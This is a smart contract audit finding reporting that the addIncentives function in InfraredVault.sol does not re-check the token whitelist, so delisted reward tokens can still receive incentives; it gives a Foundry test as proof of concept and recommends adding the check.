# Delisted reward tokens can still earn incentives through addIncentives because of inadequate validation

# Summary

The addIncentives function in InfraredVault.sol checks reward tokens by confirming if they were previously added through rewardData, but it does not verify their current status on the whitelist. This oversight means that tokens that have been delisted can still receive incentives, which could put users at risk from compromised or vulnerable tokens that were deliberately removed from the protocol.

# Finding Description

The addIncentives function in InfraredVault.sol has a vulnerability in its token validation process that could enable malicious users to bypass the protocol's token whitelisting security measures. The function only verifies if the token was previously included as a reward token via rewardData, but it does not check whether the token is currently whitelisted using isWhitelisted.

# Impact Explanation

1. The whitelisting mechanism is bypass as a result of this issue

# Proof of Concept

A coded function in the InfraredVaultTest

`
function testAddIncentivesWithDelistedRewardToken() public {
// First whitelist and add a reward token
address rewardToken = address(new MockERC20("Reward", "RWD", 18));
uint256 rewardAmount = 100 ether;
uint256 rewardsDuration = 7 days;

        vm.startPrank(infraredGovernance);
        infrared.updateWhiteListedRewardTokens(rewardToken, true);
        infrared.addReward(address(wbera), rewardToken, rewardsDuration);
        vm.stopPrank();

        // Verify reward token is properly set up
        (, uint256 duration,,,,,) = infraredVault.rewardData(rewardToken);
        assertEq(duration, rewardsDuration, "Reward duration should be set");

        // Delist the reward token
        vm.prank(infraredGovernance);
        infrared.updateWhiteListedRewardTokens(rewardToken, false);

        // Demonstrate we can still add incentives despite token being delisted
        deal(rewardToken, address(this), rewardAmount);
        ERC20(rewardToken).approve(address(infrared), rewardAmount);

        // This should revert but doesn't
        infrared.addIncentives(address(wbera), rewardToken, rewardAmount);

        // Verify incentives were added despite token not being whitelisted
        uint256 vaultBalance =
            ERC20(rewardToken).balanceOf(address(infraredVault));
        assertEq(
            vaultBalance, rewardAmount, "Incentives added for delisted token"
        );
    }

`

# Recommendation

1. Add a whitelist check in addIncentives function before moving forward with token reward processing
2. Add a pause mechanism in case of emergencies
